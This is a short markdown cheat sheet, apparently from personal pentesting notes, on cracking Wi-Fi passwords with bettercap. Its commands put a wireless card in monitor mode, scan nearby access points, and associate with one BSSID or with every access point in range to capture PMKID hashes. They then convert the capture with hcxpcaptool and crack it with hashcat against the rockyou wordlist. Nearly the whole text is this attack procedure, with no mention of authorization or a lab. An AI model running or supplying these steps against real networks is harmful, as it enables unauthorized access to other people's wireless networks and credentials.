---
title: "Bettercap"
date: 2025-02-16T23:14:38-03:00
tags: ['wifi']
---
```console
sudo su
airmon-ng start wlan0
bettercap
set wifi.interface wlan0mon
wifi.recon on
wifi.show
```

We now need to associate with an access point using the BSSID. 

```console
wifi.assoc 68:14:01:5a:0e:9c
```

Similarly, if you want to capture PMKID of all the Access Points, 

```console
wifi.assoc all
```

We now need to convert this pcap file in Hashcat format and crack it as we did
before, so: 

```console
hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
```
